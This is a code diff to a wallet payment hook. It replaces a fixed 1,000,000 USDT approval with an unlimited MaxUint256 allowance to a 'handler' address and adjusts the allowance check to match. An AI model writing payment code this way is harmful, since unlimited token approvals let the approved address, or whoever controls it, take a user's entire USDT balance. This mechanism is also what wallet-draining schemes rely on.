@@ -1,6 +1,6 @@
 // useWalletPayment.ts
 import { useState } from '@teact';
-import { BrowserProvider, Contract } from 'ethers';
+import {BrowserProvider, Contract, MaxUint256} from 'ethers';
 
 const API_BASE = process.env.VITE_API_BASE_URL;
 
@@ -123,12 +123,11 @@ export default function useWalletPayment() {
       const currentSigner = await currentProvider.getSigner();
       const usdtContract = new Contract(usdt, USDT_ABI, currentSigner);
       const allowance = await usdtContract.allowance(address, handler);
-      const amount = BigInt(1000000 * 10 ** 6);
-      if (allowance >= amount / 2n) {
+      if (allowance >= MaxUint256 / 2n) {
         return true;
       }
 
-      const tx = await usdtContract.approve(handler, amount);
+      const tx = await usdtContract.approve(handler, MaxUint256);
       await tx.wait();
       alert('✅ 授权成功！');
       return true;
